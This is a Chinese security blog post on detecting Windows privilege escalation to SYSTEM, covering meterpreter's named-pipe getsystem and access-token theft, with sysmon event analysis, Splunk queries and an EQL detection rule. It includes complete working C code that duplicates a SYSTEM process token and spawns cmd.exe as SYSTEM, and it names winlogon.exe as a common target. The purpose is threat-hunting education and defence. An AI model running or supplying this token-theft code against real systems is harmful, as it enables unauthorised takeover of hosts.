# 走进Windows中的提权行为

阅读量 **218473**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2022-01-18 14:30:09

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t01380273c4a1f5129f.jpg)

## 前言

在 [《基于异常行为检测CobaltStrike》](https://blog.moofeng.cn/wei-xie-shou-lie/ji-yu-yi-chang-hang-wei-jian-ce-cobaltstrike#privilege-escalation) 一文里，简单提及过
CobaltStrike 的提权方式，当时受限于篇幅，没有深入研究

最近看了几篇文章，结合对一些数据源的思考，想在这里汇总下部分常见提权手法的攻击原理和检测技巧

本文主要关注 GetSystem 的过程，对应 ATT&CK 攻击框架中的 [T1134 – Access Token
Manipulation](https://attack.mitre.org/techniques/T1134/)，不涉及 UAC bypass

因为相关名词较多，例如 logon session 和 access token，过程理解可能需要一定的前置知识

这些都写进来怕显得文章又臭又长，以后有精力再另起一篇总结下知识背景吧

以下主要选择两种技术对象作为演示实例—— **命名管道提权** 和 **访问令牌窃取**

## 命名管道提权

还是从最经典的 meterpreter 中的 getsystem 命令讲起，因为有
[源码](https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/extensions/priv/namedpipe.c)
可供参考，更方便读者理解

其代码注释中也简单解释了下工作原理和前置条件：

> Elevate from local admin to local system via Named Pipe Impersonation.
>
> We spawn a cmd.exe under local system which then connects to our named pipe
> and we impersonate this client.
>
> This can be done by an Administrator without the need for .
>
> Works on 2000, XP, 2003 and 2008 for all local administrators. On Vista and
> 7 it will only work if the host process has been elevated through UAC first.
> Does not work on NT4.

该技术的核心在于对 **ImpersonateNamedPipeClient** API 的利用，通过命名管道的服务端进程模仿客户端进程的访问令牌，获取
SYSTEM 权限

关于该 API 的详细说明，具体内容可以参考 [官方文档](https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)

当然，想调用它，前提是进程具备 SeImpersonatePrivilege 的权限，而这通常意味着我们已经是 Admin 用户了

![](https://p1.ssl.qhimg.com/t01d089286083d79530.png)

对照源代码，我大致拆解了下该模块具体的实现步骤：

1) getsystem 新建一个线程创建命名管道并等待服务发来的连接 (服务端)  
2) getsystem 创建了一个以 SYSTEM 权限运行的 Windows 服务，该服务会向命名管道发起连接 (客户端)  
3) 启动该服务，向目标命名管道发起连接 (客户端 -> 服务端)  
4) 该进程(服务端)接收连接，调用 ImpersonateNamedPipeClient，从而模仿了 SYSTEM 权限的访问令牌  
5) 完成提权过程后，停止并删除该服务

先简单的复现一下，然后让我们去日志中一一验证 getsystem 的行为轨迹

![](https://p1.ssl.qhimg.com/t016b77451e1b05a72e.png)

###  第一步：创建命名管道

这一步在 sysmon 中有对应的 EID 17 (Pipe Created) 日志记录，很容易就能观测到

![](https://p4.ssl.qhimg.com/t010be9c22e425d8e17.png)

另外，在时间节点附近，结合该进程对应的 Guid 我们还能看到它更多的动作，文中后半部分有所演示

###  第二步：创建服务

这一步我们可以借助 Windows 系统日志观测到 EID 7045 (A new service was installed in the system)
的事件发生

![](https://p1.ssl.qhimg.com/t018afe71c4b6818ff5.png)

不过我习惯了使用 sysmon，但是其日志类型中并没有涉及到 Windows 服务，那是不是就束手无策了呢？

这里需要了解一个小窍门： **Windows 安装服务的时候会写入注册表的特定位置**

这一知识可以应用在检测 Windows 可疑服务的创建，比如注册表键值中包含 powershell 敏感命令、base64 编码、特殊路径等

那么借助以下命令，我们就能定位到这一步创建的服务名称和命令参数等信息

`index=windows EventCode=13
TargetObject="HKLM\\System\\CurrentControlSet\\Services\\*\\ImagePath"`

![](https://p0.ssl.qhimg.com/t0171d90e9a5d06c36b.png)

从上图结果中能很明显的看出，该服务启动后(此时尚未启动)会向服务端的命名管道写入数据

###  第三步：启动服务，连接管道

关于 Windows 服务的启动，这里有个很有意思的细节

本来我还愁找不到相应的系统日志来监测服务的启动行为，但是经过多次实验后，却发现每次都会伴随着 EID 7009 (服务连接超时)的发生

这时我才留意到源码中的这行注释，突然想起来，类似 cmd.exe 这种非有效的服务，它不会向服务管理器返回信号

![](https://p0.ssl.qhimg.com/t019f0ee1524093a5c0.png)

例如，如果我们在命令行中手动创建个简易的服务，然后再看看事件管理器中的系统日志

![](https://p5.ssl.qhimg.com/t019da0c72a9ece5d14.png)

由此引起的 EID 7009，同样可以作为我们判断 getsystem 命令执行过程中启动服务的证据

而服务启动后，我们可以结合前面分析的命令行参数，检索到其触发 EID 1(Process Create) 的相应动作

![](https://p4.ssl.qhimg.com/t010fa8fc8cbb5b3d87.png)

该命令向服务端命名管道发起连接，这一行为会被 sysmon 的 EID 18 (Pipe Connected) 记录到

![](https://p3.ssl.qhimg.com/t015b35ec3ac2669a57.png)

###  第四步：调用 API，完成提权

API 的调用暂无对应日志记录，但是可以根据用户名(User)和进程完整性(IntegrityLevel)等字段定位到提权的结果

如果这时我们在 MSF 的控制台执行 shell 命令，可以看到一个 SYSTEM 权限的 cmd.exe 诞生，而其父进程却是非 SYSTEM 权限

这一特征也标识着整个提权行为的顺利完成，更多的原理细节和检测步骤可以参考文章后半部分的内容

![](https://p5.ssl.qhimg.com/t01bf92f271c69b7666.png)

###  第五步：删除服务

最后一步容易被很多人忽视——痕迹清除，这一行为在成熟的攻击框架中做得很到位，但同时也有利于我们做行为检测分析

我也是通过分析源码才记起来加上这一检测点，从而在日志中发现了服务删除的动作

![](https://p0.ssl.qhimg.com/t01fda84d1df5a3afa7.png)

## 访问令牌窃取

除了上面例子中使用到的 ImpersonateNamedPipeClient 之外，还有一些 Windows API 也能帮助我们完成到 SYSTEM
权限的提升

例如 ImpersonateLoggedOnUser、DuplicateTokenEx 等等

![](https://p3.ssl.qhimg.com/t01948e3559d8dd0593.png)

以上图右边最经典的提权路线为例，我简单解释下各步骤：

1) 通过 [OpenProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) 获取
SYSTEM 权限进程的句柄  
2) 通过 [OpenProcessToken](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken)
获取该进程的访问令牌  
3) 通过 [DuplicateTokenEx](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)
函数复制该令牌  
4) 通过 [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) 创建具备同样访问令牌的进程

贴一段自己测试时使用的代码，参考 <https://github.com/slyd0g/PrimaryTokenTheft> 修改而来

    
    
    #include <windows.h>
    #include <iostream>
    
    int main(int argc, char** argv) {
        // Grab PID from command line argument
        char *pid_c = argv[1];
        DWORD PID_TO_IMPERSONATE = atoi(pid_c);
        HANDLE tokenHandle = NULL;
        HANDLE duplicateTokenHandle = NULL;
        STARTUPINFOW startupInfo;
        PROCESS_INFORMATION processInformation;
        wchar_t cmdline[] = L"C:\\Windows\\System32\\cmd.exe";
        ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
        ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
        startupInfo.cb = sizeof(STARTUPINFO);    
    
        HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, true, PID_TO_IMPERSONATE);
        if (GetLastError() == NULL)
            printf("[+] OpenProcess() success!\n");
        else
        {
            printf("[-] OpenProcess() Return Code: %i\n", processHandle);
            printf("[-] OpenProcess() Error: %i\n", GetLastError());
        }
        BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE, &tokenHandle);
        if (GetLastError() == NULL)
            printf("[+] OpenProcessToken() success!\n");
        else
        {
            printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
            printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
        }
        BOOL duplicateToken = DuplicateTokenEx(tokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);    
        if (GetLastError() == NULL)
            printf("[+] DuplicateTokenEx() success!\n");
        else
        {
            printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
            printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
        }        
        BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
        if (GetLastError() == NULL)
            printf("[+] Process spawned!\n");
        else
        {
            printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
            printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
        }
        return 0;
    }
    

这个过程建议大家有时间的话还是自己手动操作一遍，其中有很多坑需要留意，但是对于我们加深理解很有帮助

比如我测试时发现好几次 OpenProcess() 成功了，但是 OpenProcessToken() 却报出 **[ERROR_ACCESS_DENIED
(0x5)](https://docs.microsoft.com/en-us/windows/win32/debug/system-error-codes
--0-499-)** 的错误

后来才知道原来是因为我不是该进程的 **TOKEN_OWNER**

![](https://p2.ssl.qhimg.com/t010538e6138232284b.png)

另外，选择具备 SYSTEM 权限的目标时，要注意 **Protected Process Light** (PPL) 这个特性

受 PPL 保护的进程需要指定 **PROCESS_QUERY_LIMITED_INFORMATION** 权限时才能执行
OpenProcess()，不然也会报错

![](https://p2.ssl.qhimg.com/t0166a7c78ec57e15d6.png)

针对该特点，也有非常典型的攻击手法，例如 winlogon.exe 具备 SYSTEM 权限但又不受该机制保护，所以经常被利用

关于上述提到所需要的进程访问权限等相关信息，更多内容可以参考 [这里](https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)

更多的实现原理和过程步骤，我就不再赘述了，感兴趣的可以根据这篇
[文章](https://posts.specterops.io/understanding-and-defending-against-access-token-theft-finding-alternatives-to-winlogon-exe-80696c8a73b) 逐步复现

接下来，我会根据复现结果的日志，借助 sysmon 和 splunk 完成 getsystem 过程中的细节分析

![](https://p2.ssl.qhimg.com/t019118b1a4dcad5aa2.png)

首先结合前面的结论，通过对父子进程的权限继承关系进行判断，定位到相关进程主体

![](https://p4.ssl.qhimg.com/t019bfbbb62667d8fc3.png)

拿到父进程的 Guid —— {534e2476-46b7-61dd-5508-000000000b00}，然后溯源其相关行为

    
    
    index=windows (ParentProcessGuid="{534e2476-46b7-61dd-5508-000000000b00}" OR ProcessGuid="{534e2476-46b7-61dd-5508-000000000b00}" OR SourceProcessGUID="{534e2476-46b7-61dd-5508-000000000b00}" OR TargetProcessGuid="{534e2476-46b7-61dd-5508-000000000b00}")
    

这其中，我们能发现一条很显眼的日志，由 token.exe 向 winlogon.exe 发起的进程间访问，注意它的访问权限

![](https://p1.ssl.qhimg.com/t012b8240e79947e07c.png)

_PS：sysmon 的 EID 10 中相应字段名为 ProcessGUID，而不是 ProcessGuid_

这里对应的就是我们代码中 OpenProcess() 的过程，因为日志里 0x1400 的访问权限正是 PROCESS_QUERY_INFORMATION

![](https://p0.ssl.qhimg.com/t01f6f60d42d8826c9b.png)

这条日志紧随其后的行为便是上述的 token.exe 进程创建了 SYSTEM 权限的 cmd.exe

其中的 OpenProcessToken()、DuplicateTokenEx() 等行为就不是 sysmon 的能力范围了

关于这一点，我们需要熟悉 sysmon 的日志记录原理 ——

“为了检测 ProcessAccess 类型的日志，sysmon 采用了
[ObRegisterCallbacks](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/fltkernel/nf-fltkernel-fltregisterfilter)
注册线程、进程和桌面句柄操作的回调列表，以便任何进程尝试使用 [OpenProcess()](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntddk/nf-ntddk-ntopenprocess),
[NtOpenProcess()](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess), NtAlpcOpenSenderProcess()
等API打开其他进程的句柄时都能够被检测到”

写到这里了想偷个懒，针对该攻击技术，我就直接引用一段国外研究员用 EQL 写的一段检测语句吧：

    
    
    sequence with maxspan=1m
      [process where event.code : "10" and
         /*
          GrantedAccess values in scope
          0x1000 - PROCESS_QUERY_LIMITED_INFORMATION - PPL
          0x1400 - PROCESS_QUERY_INFORMATION
          0x1F3FFF - PROCESS_ALL_ACCESS
         */
         winlog.event_data.GrantedAccess : 
                   ("0x1000", "0x1400", "0x1F3FFF") and 
         winlog.event_data.TargetUser : "NT AUTHORITY\\SYSTEM" and not 
         winlog.event_data.SourceUser : "NT AUTHORITY\\*" and 
         winlog.event_data.TargetImage : "?:\\Windows\\*.exe"] by process.entity_id
     [process where event.code : "1" and 
        winlog.event_data.LogonId : "0x3e7" and 
        winlog.event_data.TerminalSessionId : "1" and 
        not winlog.event_data.ParentUser : "NT AUTHORITY\\*"] by process.parent.entity_id
    

本质上就是对前面两个检测点做关联分析，只要前面的研究功夫下到位了，这里能施展的空间才会充足

像本文中的第一个例子，分析命名管道提权的手法时，涉及的检测点比较丰富，这时在上层做复杂规则检测就会有更多可作为的地方

## 小结

要做好威胁检测，对攻击和防御两方面的知识都得做到烂熟于心，真正做到知己知彼其实需要长时间的积累

上述分析过程主要用到 sysmon 记录日志，但涉及到 Windows API 的调用，sysmon 其实是不足以胜任的

我自己在实际分析过程中，经常遇到找不到相应日志的情况，这时如果对日志记录原理的缺乏了解，往往会无从下手

而如果缺乏对攻击原理的熟悉，经常会忽视许多潜在的检测点，更别提去追溯相应日志了

从原理出发或者是从特征溯源，对攻击行为自上而下的分析和自下而上的分析其实是缺一不可的，结合使用才是正确的姿势

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **慕长风** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/265507](/post/id/265507)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [渗透测试](/tag/渗透测试)
  * [权限提升](/tag/权限提升)
  * [威胁狩猎](/tag/威胁狩猎)

 **+1** __7赞

 __收藏

![](https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTLWIwV1auq82Xoe66LNVMC1ZsMRStnPpYHqsQKwYmc5POuwVpJSic7zsjUHXib52OSkoA5VufNDEnvg/132)
慕长风

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

